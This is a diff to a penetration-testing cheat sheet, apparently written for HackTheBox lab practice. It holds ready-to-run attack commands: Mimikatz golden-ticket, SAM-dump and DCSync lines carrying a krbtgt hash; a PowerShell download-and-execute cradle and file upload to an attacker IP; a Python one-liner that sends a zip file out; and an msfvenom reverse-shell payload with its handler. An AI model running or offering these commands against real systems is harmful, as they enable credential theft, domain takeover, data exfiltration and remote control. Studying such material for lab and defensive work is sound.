@@ -411,7 +411,7 @@ whoami /user
 .\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /ptt /domain:htb.local /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:cc36cf7a8514893efccd332446158b1a" "exit"
 
 # lsadump
-.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
 .\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:htb.local" "exit"
 ```
 ### AD
@@ -717,6 +717,7 @@ socks5 127.0.0.1 1080
 ```bash
 impacket-smbserver work /root/work -smb2support
 
+copy  \\192.168.\test.zip
 xcopy Win32\* \\FILE04\c$\Windows\Temp\ /s /e
 ```
 ## FTP
@@ -733,7 +734,7 @@ ascii
 https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
 ```bash
 #powershell
-IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37:8000/PSUpload.ps1');Invoke-FileUpload -Uri http://10.10.14.37:8000/upload -File 
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PSUpload.ps1');Invoke-FileUpload -Uri http://10.10.14.37:8000/upload -File 
 
 # linux
 python3 -c "import requests;requests.post(\"http://10.10.14.68:8000/upload\",files={\"files\":open(\"/home/lnorgaard/RT30000.zip\",\"rb\")})"
@@ -750,6 +751,7 @@ for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
 ## Metasploit
 ```bash
 # hundler
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=1234 -f exe -o shell.exe
 use multi/handler
 # sessions
 sessions -l
